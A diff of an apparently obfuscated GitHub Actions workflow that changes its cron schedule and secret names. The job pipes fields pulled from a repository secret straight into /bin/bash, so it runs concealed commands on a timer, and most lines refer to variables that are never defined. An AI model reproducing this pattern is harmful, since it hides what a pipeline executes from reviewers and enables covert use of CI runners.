@@ -1,8 +1,9 @@
 name: jiyunqian4189
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 4/6 * * *'
+    - cron: '55 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: jiyunqian4189
         env:
-          kbgpo55: ${{ secrets.kbgpo55 }}
+          s56: ${{ secrets.s56 }}
         run: |
-          echo $kbgpo55 | jq -r .u27424 | /bin/bash
-          echo $vcrzb9 | jq -r .ftxl70058 | /bin/bash
-          echo $yngn340 | jq -r .sy96 | /bin/bash
-          echo $noeh159 | jq -r .shcz0 | /bin/bash
-          echo $c42458 | jq -r .a9 | /bin/bash
-          echo $sp53862 | jq -r .slb121 | /bin/bash
-          echo $qvfc955 | jq -r .jxds36 | /bin/bash
-          echo $lwcew51 | jq -r .ak74451 | /bin/bash
-          echo $vuyvg739 | jq -r .ic23 | /bin/bash
-          echo $q506 | jq -r .kri7 | /bin/bash
-          echo $jr49 | jq -r .uyu20 | /bin/bash
+          echo $s56 | jq -r .rafro6341 | /bin/bash
+          echo $ypd79833 | jq -r .qxfu32388 | /bin/bash
+          echo $y21 | jq -r .y21 | /bin/bash
+          echo $ama7 | jq -r .vapi9 | /bin/bash
+          echo $uah231 | jq -r .lwojp120 | /bin/bash
+          echo $x53635 | jq -r .pz35592 | /bin/bash
+          echo $up1744 | jq -r .rw62 | /bin/bash
+          echo $fzu5 | jq -r .talwa99 | /bin/bash
+          echo $okbrt752 | jq -r .elu5549 | /bin/bash
 
